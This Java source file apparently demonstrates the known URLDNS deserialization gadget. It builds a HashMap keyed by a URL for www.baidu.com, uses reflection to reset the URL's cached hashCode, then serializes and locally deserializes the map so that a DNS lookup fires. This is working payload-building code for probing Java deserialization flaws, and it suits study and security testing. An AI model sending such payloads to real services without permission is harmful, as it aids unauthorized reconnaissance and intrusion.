import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

public class URLDNS {
    public static void main(String[] args) throws Exception {
        URLStreamHandler handler = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }
        };

        URL url = new URL(null,"http://www.baidu.com",handler);
        HashMap map = new HashMap();
        map.put(url, null);


        Field field = url.getClass().getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url, -1);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(baos);
        out.writeObject(map);
        byte[] bytes = baos.toByteArray();

        ByteArrayInputStream in = new ByteArrayInputStream(bytes);
        ObjectInputStream inputStream = new ObjectInputStream(in);
        inputStream.readObject();
    }
}
